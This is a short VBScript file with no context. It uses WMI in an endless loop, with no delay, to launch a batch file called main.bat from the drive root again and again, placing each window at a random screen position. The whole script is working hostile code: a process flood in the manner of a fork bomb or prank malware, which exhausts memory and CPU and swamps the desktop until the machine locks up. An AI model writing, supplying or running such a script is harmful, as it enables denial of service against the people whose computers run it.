Set WshShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("Wscript.Shell")

Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objConfig = objWMIService.Get("Win32_ProcessStartup")

strPath = objShell.CurrentDirectory
strDrive = objFSO.GetDriveName(strPath)
path = strDrive & "\main.bat"

do
	Dim x_max,y_max,min
	x_max = 1600
	y_max = 900
	min = 0
	Randomize

	x_var = (x_max-min+1)*Rnd+min
	y_var = (y_max-min+1)*Rnd+min

	objConfig.SpawnInstance_
	objConfig.X = x_var
	objConfig.Y = y_var

	Set objNewProcess = objWMIService.Get("Win32_Process")

	intReturn = objNewProcess.Create(path, Null, objConfig, intProcessID)
loop